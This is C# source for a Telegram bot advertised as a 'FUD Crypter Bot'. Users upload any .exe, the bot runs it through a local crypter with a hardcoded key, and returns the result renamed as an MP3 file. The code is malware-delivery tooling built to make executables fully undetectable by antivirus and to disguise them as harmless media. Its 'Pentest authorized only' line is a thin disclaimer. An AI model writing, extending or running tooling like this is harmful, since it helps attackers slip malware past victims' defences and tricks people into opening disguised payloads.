using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class TelegramBot
{
    static readonly HttpClient http = new();
    static readonly string TOKEN = "YOUR_BOT_TOKEN_HERE";
    static readonly string CRYPTER_PATH = @"C:\CrypterTools\bin\Release\net8.0\Crypter.exe";
    
    static async Task Main()
    {
        string offset = "";
        while (true)
        {
            var updates = await GetUpdates(offset);
            foreach (var update in updates.result)
            {
                offset = update.update_id + 1 + "";
                await ProcessMessage(update.message);
            }
            await Task.Delay(1000);
        }
    }
    
    static async Task ProcessMessage(dynamic message)
    {
        long chatId = message.chat.id;
        string text = message.text ?? "";
        
        if (text == "/start")
        {
            await SendMessage(chatId, 
                "🔥 *FUD Crypter Bot*\n\n" +
                "📤 Send me any .exe → Get FUD MP3!\n" +
                "🔑 Default key: `FUD2026KEY!`\n\n" +
                "*Pentest authorized only*", 
                true);
        }
        else if (message.document != null)
        {
            await SendMessage(chatId, "🔄 Processing your file...");
            
            // Download file
            string fileId = message.document.file_id;
            var fileInfo = await http.GetFromJsonAsync<dynamic>($"https://api.telegram.org/bot{TOKEN}/getFile?file_id={fileId}");
            string filePath = $"downloads/{fileInfo.result.file_path}";
            
            // Download to temp
            var fileBytes = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot{TOKEN}/{fileInfo.result.file_path}");
            Directory.CreateDirectory("temp");
            await File.WriteAllBytesAsync($"temp/input.exe", fileBytes);
            
            // Run Crypter
            var process = new Process {
                StartInfo = new() {
                    FileName = CRYPTER_PATH,
                    Arguments = $"temp/input.exe temp/fud.mp3 FUD2026KEY!",
                    UseShellExecute = false,
                    RedirectStandardOutput = true
                }
            };
            process.Start();
            string output = await process.StandardOutput.ReadToEndAsync();
            await process.WaitForExitAsync();
            
            // Send FUD MP3
            await using var fudFile = File.OpenRead("temp/fud.mp3");
            using var content = new MultipartFormDataContent();
            content.Add(new StreamContent(fudFile), "document", "fud.mp3");
            var formResponse = await http.PostAsync($"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chatId}", content);
            
            await SendMessage(chatId, $"✅ *FUD Complete!*\n\n{output}\n\n🔥 MP3 sent!", true);
            
            // Cleanup
            Directory.Delete("temp", true);
        }
    }
    
    static async Task SendMessage(long chatId, string text, bool markdown = false)
    {
        var url = $"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(text)}";
        if (markdown) url += "&parse_mode=Markdown";
        await http.GetAsync(url);
    }
    
    static async Task<dynamic> GetUpdates(string offset)
    {
        var url = $"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}";
        return await http.GetFromJsonAsync<dynamic>(url);
    }
}